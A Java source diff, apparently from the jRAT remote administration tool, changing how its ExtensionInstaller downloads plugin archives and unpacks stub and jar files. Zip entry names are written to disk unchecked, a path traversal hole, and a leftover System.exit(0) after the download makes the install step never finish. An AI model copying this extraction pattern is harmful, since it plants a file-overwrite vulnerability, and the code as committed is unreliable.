@@ -23,7 +23,6 @@ import pro.jrat.client.net.WebRequest;
 import pro.jrat.common.codec.Hex;
 import pro.jrat.common.listeners.CopyStreamsListener;
 import pro.jrat.common.utils.IOUtils;
-import pro.jrat.common.utils.MathUtils;
 
 public class ExtensionInstaller {
 
@@ -50,7 +49,7 @@ public class ExtensionInstaller {
 	}
 
 	public void install() throws Exception {
-		listener.status(Color.black, "Connecting...", 0);
+		listener.status(Color.black, "Connecting...", 0, 100);
 
 		File temp = File.createTempFile(plugin.getName() + "_temp_download", ".zip");
 
@@ -62,6 +61,7 @@ public class ExtensionInstaller {
 		}
 
 		HttpURLConnection archiveConnection = (HttpURLConnection) WebRequest.getConnection(Constants.HOST + "/plugins/getplugin.php?plugin=" + plugin.getName() + "&key=" + key);
+		archiveConnection.setConnectTimeout(15000);
 		archiveConnection.connect();
 
 		int response = archiveConnection.getResponseCode();
@@ -76,19 +76,29 @@ public class ExtensionInstaller {
 
 		InputStream archive = archiveConnection.getInputStream();
 
-		long length = archiveConnection.getContentLengthLong();
+		final int length = archiveConnection.getContentLength();
 
 		FileOutputStream out = new FileOutputStream(temp);
+		
+		
 
 		IOUtils.copy(length, archive, out, new CopyStreamsListener() {
 			@Override
 			public void chunk(long current, long total, int percent) {
-				listener.status(Color.black, "Downloaded " + (current / 1024L) + "/" + (total / 1024L) + " kB", percent);
+				if (length == -1) {
+					listener.status(Color.black, "Downloaded " + (current / 1024L) + " kB", (int) current, -1);
+				} else {
+					listener.status(Color.black, "Downloaded " + (current / 1024L) + "/" + total + " kB", (int) current, -1);
+				}
 			}
 		});
 
 		archive.close();
 		out.close();
+		
+		System.out.println(temp.getAbsolutePath());
+		
+		System.exit(0);
 
 		ZipFile zip = new ZipFile(temp);
 		Enumeration<? extends ZipEntry> entriesEnum = zip.entries();
@@ -97,16 +107,19 @@ public class ExtensionInstaller {
 		while (entriesEnum.hasMoreElements()) {
 			entries.add(entriesEnum.nextElement());
 		}
+		
+		List<File> mainJars = new ArrayList<File>();
 
 		for (int i = 0; i < entries.size(); i++) {
 			ZipEntry entry = entries.get(i);
 
 			File output;
 
-			if (entry.getName().startsWith("stub_")) {
-				output = new File("plugins/stubs/" + plugin.getName() + " " + entry.getName().substring(5, entry.getName().length()));
-			} else if (entry.getName().equalsIgnoreCase("client.jar")) {
-				output = new File("plugins/" + plugin.getName() + ".jar");
+			if (entry.getName().startsWith("stubs/")) {
+				output = new File("plugins/stubs/" + plugin.getName() + " " + entry.getName().substring(6, entry.getName().length()));
+			} else if (entry.getName().startsWith("root/")) {		
+				output = new File("plugins/" + entry.getName().substring(5, entry.getName().length()));
+				mainJars.add(output);
 			} else {
 				output = new File("plugins/" + plugin.getName() + "/" + entry.getName());
 			}
@@ -117,7 +130,7 @@ public class ExtensionInstaller {
 
 			output.createNewFile();
 
-			listener.status(Color.black, "Writing " + output.getName(), MathUtils.getPercentFromTotal(i, entries.size()));
+			listener.status(Color.black, "Writing " + output.getName(), i, entries.size());
 
 			InputStream entryIs = zip.getInputStream(entry);
 			FileOutputStream entryOut = new FileOutputStream(output);
@@ -132,7 +145,9 @@ public class ExtensionInstaller {
 
 		temp.delete();
 
-		new Plugin(plugin.getJar());
+		for (File file : mainJars) {
+			new Plugin(file);
+		}
 
 		Main.instance.reloadPlugins();
 	}
